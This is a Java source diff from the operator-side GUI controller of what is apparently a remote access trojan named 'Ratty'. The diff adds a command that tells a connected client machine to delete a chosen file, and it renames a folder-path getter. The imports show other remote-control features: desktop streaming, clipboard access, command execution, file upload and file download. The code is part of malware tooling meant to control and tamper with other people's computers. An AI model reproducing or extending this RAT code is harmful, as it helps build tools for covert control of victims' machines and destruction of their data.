@@ -11,6 +11,7 @@ import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
+import de.sogomn.rat.packet.DeletePacket;
 import de.sogomn.rat.packet.DesktopStreamPacket;
 import de.sogomn.rat.packet.DownloadPacket;
 import de.sogomn.rat.packet.ExecutePacket;
@@ -106,7 +107,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			if (file != null) {
 				final String localPath = file.getAbsolutePath();
 				final FileTreePanel treePanel = serverClient.getTreePanel();
-				final String path = treePanel.getLastNodeClickedFolder();
+				final String path = treePanel.getLastNodePathFolder();
 				final UploadPacket packet = new UploadPacket(localPath, path);
 				
 				return packet;
@@ -119,7 +120,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			return packet;
 		} else if (command == FileTreePanel.NEW_FOLDER) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
-			final String path = treePanel.getLastNodeClickedFolder();
+			final String path = treePanel.getLastNodePathFolder();
 			final String name = JOptionPane.showInputDialog(null);
 			
 			if (name != null && !name.isEmpty()) {
@@ -127,6 +128,14 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 				
 				return packet;
 			}
+		} else if (command == FileTreePanel.DELETE) {
+			final FileTreePanel treePanel = serverClient.getTreePanel();
+			final String path = treePanel.getLastPathClicked();
+			final DeletePacket packet = new DeletePacket(path);
+			
+			treePanel.removeFile(path);
+			
+			return packet;
 		}
 		
 		return null;
